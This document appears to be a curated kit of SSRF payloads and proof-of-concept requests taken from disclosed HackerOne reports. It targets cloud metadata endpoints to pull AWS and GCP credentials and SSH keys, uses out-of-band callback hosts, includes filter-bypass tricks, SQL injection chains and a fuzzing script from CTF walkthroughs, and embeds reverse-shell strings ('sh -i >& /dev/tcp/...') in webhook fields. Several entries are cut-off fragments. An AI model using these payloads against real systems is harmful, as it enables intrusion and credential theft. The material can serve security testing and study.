# Server-Side Request Forgery (SSRF)  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#1086206](https://hackerone.com/reports/1086206)  -  Blind SSRF vulnerability on cz.acronis.com
*medium*

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: cz.acronis.com
Referer: https://cz.acronis.com/kosik/?item=7200
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 582
Cookie: _ga=GA1.2.1144740602.1610556882; _fbp=fb.1.1610556883161.353705208; leady_session_id=8dd6174…

items%5B0%5D%5Bname%5D=Acronis+Disk+Director+12.5+Home+1+PC&items%5B0%5D%5Bprice%5D=1056&items%5B0%5D%5BformattedPrice%5D=1056.00k%C4%8D&totalSurcharge=1056&addItem=undefined&removeItem=undefined&recalculate=undefined&name=Jmone&isCompany=YES&notifier_x-iscompany=NO&undefined=false&deliveryClearKatakana=true&company=&surname=Pifsf&deliveryClearRomanized=true&address=http%3a%2f%2fjczo3ewu8jpfgyiajmkacspsnjtbh0.burpcollaborator.net/ssrf&zip=25458&city=sdfasd&ico=&dic=&email=test%40fgmail.com&phone=%2B420+724+023+780&newsletter=false&notifier_x-newsletter=NO&action=createPayment
```

## 2. [#793704](https://hackerone.com/reports/793704)  -  Server-Side Request Forgery (SSRF) in Ghost CMS
*medium*

```http
GET /ghost/api/v3/admin/oembed/?url=http://169.254.169.254/metadata/v1.json&type=embed HTTP/1.1
Host: YOUR_WEBSITE
X-Requested-With: XMLHttpRequest
Content-Type: application/json; charset=UTF-8
Cookie: ghost-admin-api-session=YOUR_SESSION
```

## 3. [#781295](https://hackerone.com/reports/781295)  -  [h1-415 2020] SSRF in a headless chrome with remote debugging leads to sensible information leak
*critical*

```http
POST /support/review/efe74fb38a69eae74f733a3e035edf33ed14f34af0755495ff6abae219155587 HTTP/1.1
Host: h1-415.h1ctf.com
Referer: https://h1-415.h1ctf.com/support/review/88cdddff2719525210a5cdc95f3cf7f14c83f6e44caf87f5ec4255a9f69e35eb
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Origin: https://h1-415.h1ctf.com
Cookie: _csrf_token=46cb8a62c3c99b5d5a2c045baecf9039216a3cee; session=eyJfY3NyZl90b2tlbiI6IjQ2Y2I4YT…
```

## 4. [#1241149](https://hackerone.com/reports/1241149)  -  FULL SSRF
*low*

```http
GET /login/wl?bzIframeUrl=http%3a%2f%2f169%2e254%2e169%2e254%2flatest%2fmeta-data%2f&eventGroup=31048&eventId=228513&encryptedOrigin=1%3APXwmTfsOX5swR5WLWW1hEcWFR24vg2RCT1aflJJNM%2BchgNaRQ2fSRv7QJX3Ro27uTjR%2BUzV0z1s3siiObx%2BOHQ%3D%3D&screen=PROFILE_FULL&closable=false&emailLoginRedirectUrl=https%3A%2F%2Fsummit.acronis.events%2Fsettings%2Fprofile&colorMain=%2362a4f7&showChangeEmail=true&showTitle=false&encryptedTokens=1%3AIqgWUC4KnRXhJjI%2Bh4Hr1qbBFa%2FF3CT1SYs5Uv0s6S6ujzX%2FeGjQpYoJiqxy4un688xsXJXHC0CefbCMT724MnJxY%2BPoWfg3UO%2FHX49FTANq%2Fe9cyA%2BXlhLeAn7gWIAyZzg4RNnSwO0OEi%2FcFx5ozg%3D%3D&enableTicketIdLogin=true&enableFullStory=true&restrictLoginWithoutRegistration=true&IBMBannedCountries=false HTTP/1.1
Host: summit.acronis.events
Cookie: x-bz-refresh-attendee-token=1f20fffa-1d8c-4506-9cb1-a5a45f211f98; _sp_id.880c=7fe0ad97-2770-…
```

## 5. [#2300358](https://hackerone.com/reports/2300358)  -  SSRF in https://couriers.indrive.com/api/file-storage
*high*

```http
GET /api/file-storage?url=http://va99zfc0lxpm75ogmcjhz8xij9pzdo.oastify.com HTTP/2
Host: couriers.indrive.com
```

## 6. [#793704](https://hackerone.com/reports/793704)  -  Server-Side Request Forgery (SSRF) in Ghost CMS
*medium*

```http
GET /ghost/api/v3/admin/oembed/?url=http://169.254.169.254/metadata/v1.json&type=embed
```

## 7. [#3445890](https://hackerone.com/reports/3445890)  -  Link unfurling calls out to arbitrary URLs and the private-network guard misses link-local addresses
*medium*

```bash
curl -X POST https://<host>/unfurl_link -H "Cookie: session_token=..." -H "X-CSRF-Token: <token>" -d 'url=http://169.254.169.254/latest/meta-data/'
```

## 8. [#893305](https://hackerone.com/reports/893305)  -  [H1-2006 2020] CTF Writeup
*critical*

```http
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

staff_id=STF:KE624RQ2T9
```

## 9. [#893305](https://hackerone.com/reports/893305)  -  [H1-2006 2020] CTF Writeup
*critical*

```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: https://app.bountypay.h1ctf.com
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

## 10. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```bash
$ sqlmap -u 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=3dir42'

GET parameter 'hash' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 90 HTTP(s) requests:
---
Parameter: hash (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: hash=3dir42' AND 2469=2469 AND 'eVQs'='eVQs

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: hash=-9115' UNION ALL SELECT NULL,NULL,CONCAT(0x7171767871,0x6652794752675962646d466752426364554549457a736577764752754f4c537877415a7363784e73,0x71627a7871)-- -
---
```

## 11. [#1736390](https://hackerone.com/reports/1736390)  -  Mail app - blind SSRF via imapHost parameter
*low*

```http
POST /apps/mail/api/accounts HTTP/2
Host: redacted
Cookie: redacted
Content-Type: application/json
Content-Length: 333
Origin:  redacted

{"imapHost":"myimapserver.org","imapPort":993,"imapSslMode":"tls","imapUser":"xxx@xxx.org","imapPassword":"xxx","smtpHost":"mysmtpserver.org","smtpPort":465,"smtpSslMode":"tls","smtpUser":"xxx@xxx.org","smtpPassword":"xxx","accountName":"xxx@xxx.orgr","emailAddress":"xxx@xxx.org"}
```

## 12. [#1736390](https://hackerone.com/reports/1736390)  -  Mail app - blind SSRF via imapHost parameter
*low*

```http
POST /apps/mail/api/accounts HTTP/2
Host: redacted
Cookie: redacted
Content-Type: application/json
Content-Length: 333
Origin:  redacted
```

## 13. [#1741525](https://hackerone.com/reports/1741525)  -  Mail app - Blind SSRF via Sierve server fonctionnality and sieveHost parameter
*low*

```http
PUT /apps/mail/api/sieve/account/5 HTTP/2
Host: redacted
Cookie: redactedr
Content-Type: application/json
Content-Length: 117
Origin: redacted

{"sieveEnabled":true,"sieveHost":"evil.org","sievePort":"80","sieveUser":"","sievePassword":"","sieveSslMode":"none"}
```

## 14. [#1741525](https://hackerone.com/reports/1741525)  -  Mail app - Blind SSRF via Sierve server fonctionnality and sieveHost parameter
*low*

```http
PUT /apps/mail/api/sieve/account/5 HTTP/2
Host: redacted
Cookie: redactedr
Content-Type: application/json
Content-Length: 117
Origin: redacted
```

## 15. [#411865](https://hackerone.com/reports/411865)  -  Blind SSRF at https://chaturbate.com/notifications/update_push/
*high*

```http
POST /notifications/update_push/ HTTP/1.1
Host: chaturbate.com
Referer: https://chaturbate.com/princesscin/
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 408
Cookie: YOURCOOKIEHERE

subscription={"endpoint":"http:\/\/███\/wpush\/v2\/████&unsub=false
```

## 16. [#643622](https://hackerone.com/reports/643622)  -  SSRF In Get Video Contents
*medium*

```http
GET /blog/services/oembed/?url=https://1:@127.0.0.1:\@@@@w.youtube.com/@https://www.youtube.com/&callback=CKEDITOR._.jsonpCallbacks[89] HTTP/1.1
Host: www.semrush.com
Referer: https://www.semrush.com//my-posts/████/edit/
X-Forwarded-For: 127.0.0.1
```

## 17. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 18. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```http
POST /hate-mail-generator/new/preview
```

## 19. [#1553841](https://hackerone.com/reports/1553841)  -  CVE-2022-27780: percent-encoded path separator in URL host
*medium*

```http
GET http://127.0.0.1/example.com HTTP/1.1
Host: 127.0.0.1/example.com
```

## 20. [#2932960](https://hackerone.com/reports/2932960)  -  [my.stripo.email] Blind SSRF Vulnerability in Stripo App Export via Missing Endpoints Export Email Message to Zapier
*critical*

```http
POST /webhook/sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.100.3%2F9001%200%3E%261/ HTTP/1.1
Host: 5290-101-255-157-9.ngrok-free.app
Content-Length: 104
X-Forwarded-For: 54.247.167.106
X-Forwarded-Host: 5290-101-255-157-9.ngrok-free.app
```

## 21. [#2932960](https://hackerone.com/reports/2932960)  -  [my.stripo.email] Blind SSRF Vulnerability in Stripo App Export via Missing Endpoints Export Email Message to Zapier
*critical*

```http
POST /bapi/exportservice/v3/exports/WEBHOOK/accounts/52027412 HTTP/1.1
Host: my.stripo.email
Content-Type: application/json
Content-Length: 457

{
  "id": 52027412,
  "name": "sh -i & devtcp192.168.100.3 0&1",
  "oAuthRequired": false,
  "authLink": null,
  "draft": false,
  "destination": "WEBHOOK",
  "properties": {
    "headers": [
      {
        "name": "sh -i >& /dev/tcp/192.168.100.3/9001 0>&1",
        "value": "sh -i >& /dev/tcp/192.168.100.3/9001 0>&1"
      }
    ],
    "accountName": "sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
    "webhookUrl": "https://cd7c-101-255-157-9.ngrok-free.app/sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
    "webhookType": "CUSTOM"
  },
  "public": false
}
```

## 22. [#2932960](https://hackerone.com/reports/2932960)  -  [my.stripo.email] Blind SSRF Vulnerability in Stripo App Export via Missing Endpoints Export Email Message to Zapier
*critical*

```http
POST /bapi/exportservice/v3/exports/WEBHOOK/accounts/52027412 HTTP/1.1
Host: my.stripo.email
Content-Type: application/json
Content-Length: 457

{
```

## 23. [#893305](https://hackerone.com/reports/893305)  -  [H1-2006 2020] CTF Writeup
*critical*

```http
GET /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
```

## 24. [#341876](https://hackerone.com/reports/341876)  -  SSRF in Exchange leads to ROOT access in all instances
*medium*

```html
<script>
window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";
// iframes don't work here because Google Cloud sets the `X-Frame-Options: SAMEORIGIN` header.
</script>
```

## 25. [#341876](https://hackerone.com/reports/341876)  -  SSRF in Exchange leads to ROOT access in all instances
*medium*

```html
<script>
window.location="http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json";
</script>
```

## 26. [#643622](https://hackerone.com/reports/643622)  -  SSRF In Get Video Contents
*medium*

```http
GET /blog/services/oembed/?url=https://1:@127.0.0.1:\@@@@w.youtube.com/@https://www.youtube.com/&callback=CKEDITOR._.jsonpCallbacks[89] HTTP/1.1
Host: www.semrush.com
Referer: https://www.semrush.com//my-posts/████/edit/
```

## 27. [#3608558](https://hackerone.com/reports/3608558)  -  Blind POST SSRF via Web Push Notification Endpoint
*medium*

```http
POST /ssrf-poc HTTP/1.1
Host: attacker-server:9999
Content-Type: application/octet-stream
Authorization: WebPush TOKEN...
Content-Length: 3070
```

## 28. [#832858](https://hackerone.com/reports/832858)  -  SSRF via 3d.cs.money/pasteLinkToImage
*medium*

```http
POST /pasteLinkToImage HTTP/1.1
Host: 3d.cs.money
Content-Type: application/json;charset=utf-8
Content-Length: 82
Origin: https://3d.cs.money
Referer: https://3d.cs.money/
Cookie: INSERT_PRIME_COOKIES_HERE

{"link":"http:/INSERT_TARGET_URL_HERE"}
```

## 29. [#738553](https://hackerone.com/reports/738553)  -  SSRF in /cabinet/stripeapi/v1/siteInfoLookup?url=XXX
*medium*

```http
GET /cabinet/stripeapi/v1/siteInfoLookup?url=http://10.0.0.100:8080 HTTP/1.1
Host: my.stripo.email
```

## 30. [#1553841](https://hackerone.com/reports/1553841)  -  CVE-2022-27780: percent-encoded path separator in URL host
*medium*

```bash
curl -x http://127.0.0.1:8899 -H "Host: example.com" http://example.com%2F127.0.0.1/%2e%2e/
```

## 31. [#895780](https://hackerone.com/reports/895780)  -  [h1-2006 2020] CTF Walkthrough
*critical*

```javascript
$('.tab').click(function () {
	return $('.tab').removeClass('active'), $(this).addClass('active'), $('div.content').addClass('hidden'), $('div.content-' + $(this).attr('data-target')).removeClass('hidden'), !1;
}),
```

## 32. [#895780](https://hackerone.com/reports/895780)  -  [h1-2006 2020] CTF Walkthrough
*critical*

```javascript
$('.sendReport').click(function () {
	$.get('/admin/report?url=' + url, function () {
		alert('Report sent to admin team');
	}), $('#myModal').modal('hide');
}),
```

## 33. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/\"--+-","2","3"--+-

{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/","auth":"05a7e708a5f3da76506023047628829d"}
```

## 34. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/lol\"--+-","2","3"--+-

{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/lol","auth":"494c095363e0f1a99e1c869887522c62"}

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2xvbCIsImF1dGgiOiI0OTRjMDk1MzYzZTBmMWE5OWUxYzg2OTg4NzUyMmM2MiJ9

Expected HTTP status 200, Received: 404

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user\"--+-","2","3"--+-

Invalid content type detected
```

## 35. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?test=lol\"--+-","2","3"--+-

Expected HTTP status 200, Received: 400 Bad Request

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=lol\"--+-","2","3"--+-

Expected HTTP status 200, Received: 204

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?password=lol\"--+-","2","3"--+-

Expected HTTP status 200, Received: 204
```

## 36. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=__________%\"--+-","2","3"--+-  ( 10 underscores )

Expected HTTP status 200, Received: 204

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=___________%\"--+-","2","3"--+-  ( 11 underscores )

Invalid content type detected

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=____________%\"--+-","2","3"--+-  ( 12 underscores )

Expected HTTP status 200, Received: 204

OK so username has 10 characters, let's see about passoword

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=__________%\"--+-","2","3"--+-  ( 10 underscores )

Invalid content type detected

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=___________%\"--+-","2","3"--+-  ( 11 underscores )

Expected HTTP status 200, Received: 204
```

## 37. [#925527](https://hackerone.com/reports/925527)  -  Blind HTTP GET SSRF via website icon fetch (bypass of pull#812)
*low*

```http
GET /PATH_IS_KEPT HTTP/1.1
Host: redacted

^C
```

## 38. [#508459](https://hackerone.com/reports/508459)  -  SSRF in webhooks leads to AWS private keys disclosure
*high*

```
<?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
```

## 39. [#3634400](https://hackerone.com/reports/3634400)  -  SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)
*high*

```bash
TIPSEN:~:% curl -sS 'http://localhost:4568/fetch?url=http://[64:ff9b:1::7f00:1]:18081'
{"status":"allowed","code":"200","headers":{"content-type":"text/plain","content-length":"24","connection":"close"},"body":"NAT64_PREFIX_BYPASS_DEMO"}%
```

## 40. [#893305](https://hackerone.com/reports/893305)  -  [H1-2006 2020] CTF Writeup
*critical*

```html
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 07 Jun 2020 15:10:37 GMT
Content-Type: application/json
Connection: close
Content-Length: 1605

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/#\/statements?month=04&year=2020","data":"<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <h1 style=\"text-align: center\">Software Storage<\/h1>\n            <form method=\"post\" action=\"\/\">\n                <div class=\"panel panel-default\" style=\"margin-top:50px\">\n                    <div class=\"panel-heading\">Login<\/div>\n                    <div class=\"panel-body\">\n                        <div style=\"margin-top:7px\"><label>Username:<\/label><\/div>\n                        <div><input name=\"username\" class=\"form-control\"><\/div>\n                        <div style=\"margin-top:7px\"><label>Password:<\/label><\/div>\n                        <div><input name=\"password\" type=\"password\" class=\"form-control\"><\/div>\n                    <\/div>\n                <\/div>\n                <input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n            <\/form>\n        <\/div>\n    <\/div>\n<\/div>\n<script src=\"\/js\/jquery.min.js\"><\/script>\n<script src=\"\/js\/bootstrap.min.js\"><\/script>\n<\/body>\n<\/html>"}
# … truncated …
```

## 41. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```http
POST /evil-quiz/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Cookie: session=7d63eaccc80ec7b6553c0b19ec10e4d0
```

## 42. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```http
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com

action=signup&username=LMAO&password=12345&age=1e5&firstname=XXXXXXXXXXXXXXX&lastname=YYYYYYYYYYYYYYY
```

## 43. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```http
POST /evil-quiz/ HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 44. [#1066914](https://hackerone.com/reports/1066914)  -  [ Hacky Holidays CTF ] Completely taken down the Grinch Networks
*critical*

```http
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 45. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```http
GET /people-rater/entry?id=eyJpZCI6Mn0=
```

## 46. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```http
GET /people-rater/entry?id=eyJpZCI6MX0=
```

## 47. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```http
GET /swag-shop/api/user
```

## 48. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```http
GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
```

## 49. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```http
POST /secure-login HTTP/1.1

username=access&password=computer
```

## 50. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```http
POST /signup-manager/
```

## 51. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```http
GET /signup-manager/ HTTP/1.1
Cookie: token=870fa22f8c9727d9e1b527499bb55457
```

## 52. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```http
GET /r3c0n_server_4fdk59/album?hash=3dir42
```

## 53. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```http
GET /r3c0n_server_4fdk59/album?hash=fakehash'+UNION+SELECT+1337,+'my_hash',+'my_album_name'--+
```

## 54. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```http
GET /r3c0n_server_4fdk59/album?hash=fakehash'+UNION+SELECT+"1337'+UNION+SELECT+0,+0,+'my_photo.jpg'--+",+'my_hash',+'my_album_name'--+
```

## 55. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```python
#!/usr/bin/env python3

import re
import base64
import requests
import sys
  
BASE_URL = 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/'
PAYLOAD = "fakehash'+UNION+SELECT+\"1337'+UNION+SELECT+0,+0,+'..\/api\/FUZZ'--+\",+'my_hash',+'my_album_name'--+"
SECLISTS_DIR = '../../../../SecLists/Discovery/Web-Content/'

def fuzz(wordlist, avoid_code='404', prefix='', suffix=''):
    with open(SECLISTS_DIR + wordlist) as payloads:
        lines = [x.strip() for x in payloads]
        for i, line in enumerate(lines):
            process(PAYLOAD.replace('FUZZ', prefix + line + suffix), avoid_code)

def process(payload, avoid_code):
    album = requests.get(BASE_URL + 'album?hash=' + payload)
    picture_data = re.match(r".*picture\?data=(.*)\"", str(album.content)).groups()[0]

    api_call = requests.get(BASE_URL + 'picture?data=' + picture_data)

    if avoid_code not in str(api_call.content):
        print(str(base64.b64decode(picture_data)))
        print(str(api_call.content))
        return True
    return False
    
sys.argv[1] == 'endpoints' and fuzz('common-api-endpoints-mazen160.txt', avoid_code='404') # finds endpoints "ping" and "user"
sys.argv[1] == 'parameters' and fuzz('burp-parameter-names.txt', avoid_code='400', prefix='user?', suffix='=1') # finds parameters "username" and "password"
# … truncated …
```

## 56. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```http
GET parameter 'hash' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
```

## 57. [#1960765](https://hackerone.com/reports/1960765)  -  Blind SSRF to internal services in matrix preview_link API
*high, $6,000*

```http
GET █████████

There are also possibilities to test ██████, but I thought that it would be incorrect to do such activity without permission and as such report vulnerability in this state. I also therefore request a permission to try to escalate this to Critical
```

## 58. [#776017](https://hackerone.com/reports/776017)  -  Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service.
*high, $5,000*

```http
POST requests and verify that how the URL could be arbirary controlled by an attacker:

{F685801}
```

## 59. [#3634400](https://hackerone.com/reports/3634400)  -  SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)
*high*

```bash
TIPSEN:~:% NET=$(docker inspect ssrf_filter_lab --format '{{range $k,$v := .NetworkSettings.Networks}}{{$k}}{{end}}')
TIPSEN:~:% docker rm -f ssrf_filter_lab_netadmin 2>/dev/null || true
ssrf_filter_lab_netadmin
TIPSEN:~:% docker run -d --name ssrf_filter_lab_netadmin --network "$NET" --cap-add NET_ADMIN -p 4568:4567 bbp-ssrf-ssrf-app ruby app.rb
46929c09894e83249c8143c192a727f2583b116c2be0ce70e1528773fb3b388f
```

## 60. [#1092230](https://hackerone.com/reports/1092230)  -  FogBugz import attachment full SSRF requiring vulnerability in *.fogbugz.com
*high*

```rb
WHITELIST = [
  /^[^.]+\.fogbugz.com$/
].freeze

...
    
def valid_url?(url)
  url && http?(url) && valid_domain?(url)
end

def http?(url)
  url =~ /\A#{URI::DEFAULT_PARSER.make_regexp(%w(http https))}\z/
end

def valid_domain?(url)
  host = URI.parse(url).host
  WHITELIST.any? { |entry| entry === host }
end
```

## 61. [#411865](https://hackerone.com/reports/411865)  -  Blind SSRF at https://chaturbate.com/notifications/update_push/
*high*

```http
Put your cookie and CSRF token (you can copy CSRF token from your cookies) over here and than send this request

Go to this URL to confirm SSRF at - http://████████████
```

## 62. [#3473145](https://hackerone.com/reports/3473145)  -  Unauthenticated SSRF in Voxtelesys integration ('checkUrlForSsrf' Bypass via DNS rebinding)
*high*

```http
POST "http://<Rocket.Chat hostIP>/api/v1/livechat/sms-incoming/voxtelesys" \
```

## 63. [#1370731](https://hackerone.com/reports/1370731)  -  CVE-2021-40438 on cp-eu2.acronis.com
*high*

```http
patch apache
```

## 64. [#358119](https://hackerone.com/reports/358119)  -  SSRF in proxy.duckduckgo.com via the image_host parameter
*high*

```http
get parameter.

## Vulnerable URL:
```

## 65. [#893305](https://hackerone.com/reports/893305)  -  [H1-2006 2020] CTF Writeup
*critical*

```
../../redirect?url=https://software.bountypay.h1ctf.com/#
```

## 66. [#895780](https://hackerone.com/reports/895780)  -  [h1-2006 2020] CTF Walkthrough
*critical*

```
../../redirect?url=https://software.bountypay.h1ctf.com/&disregard=
```

## 67. [#895780](https://hackerone.com/reports/895780)  -  [h1-2006 2020] CTF Walkthrough
*critical*

```
../../redirect?url=https://software.bountypay.h1ctf.com/&disregard=/statements?month=0
```

## 68. [#895780](https://hackerone.com/reports/895780)  -  [h1-2006 2020] CTF Walkthrough
*critical*

```
../../redirect?url=https://software.bountypay.h1ctf.com/FUZZ&disregard=
```

## 69. [#1544133](https://hackerone.com/reports/1544133)  -  SSRF vulnerability can be exploited when a hijacked aggregated api server such as metrics-server returns 30X
*medium, $1,000*

```http
GET / HTTP/1.1
Host: 20.85.59.5
Authorization: Bearer <omitted>

GET / HTTP/1.1
```

## 70. [#1544133](https://hackerone.com/reports/1544133)  -  SSRF vulnerability can be exploited when a hijacked aggregated api server such as metrics-server returns 30X
*medium, $1,000*

```http
GET / HTTP/1.1
Host: 20.85.59.5
Authorization: Bearer  <omitted>
```

## 71. [#1832494](https://hackerone.com/reports/1832494)  -  Blind SSRF on https://my.exnessaffiliates.com/ allows for internal network enumeration
*medium*

```http
GET / HTTP/1.1
Host: sa66ovrblrbiviochnojtli2bthk5ft4.oastify.com
```

## 72. [#1086206](https://hackerone.com/reports/1086206)  -  Blind SSRF vulnerability on cz.acronis.com
*medium*

```http
POST Request, payload in address body parameter:
```

## 73. [#878779](https://hackerone.com/reports/878779)  -  Full Read SSRF on Gitlab's Internal Grafana
*critical*

```bash
curl "https://dev.gitlab.org/-/grafana/avatar/test%3fd%3dredirect.rhynorater.com%252f1.bp.blogspot.com%252fpoc.rhynorater.com%26cachebust"
```

## 74. [#2932960](https://hackerone.com/reports/2932960)  -  [my.stripo.email] Blind SSRF Vulnerability in Stripo App Export via Missing Endpoints Export Email Message to Zapier
*critical*

```bash
curl -i -X POST 'https://my.stripo.email/bapi/exportservice/v3/exports/WEBHOOK/accounts/52027412' \
--data '{
  "id": 52027412,
  "name": "sh -i & devtcp192.168.100.3 0&1",
  "oAuthRequired": false,
  "authLink": null,
  "draft": false,
  "destination": "WEBHOOK",
  "properties": {
    "headers": [
      {
        "name": "sh -i >& /dev/tcp/192.168.100.3/9001 0>&1",
        "value": "sh -i >& /dev/tcp/192.168.100.3/9001 0>&1"
      }
    ],
    "accountName": "sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
    "webhookUrl": "https://cd7c-101-255-157-9.ngrok-free.app/sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
    "webhookType": "CUSTOM"
  },
  "public": false
}'
```

## 75. [#893305](https://hackerone.com/reports/893305)  -  [H1-2006 2020] CTF Writeup
*critical*

```bash
decoded:
{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}

base64-encoded:
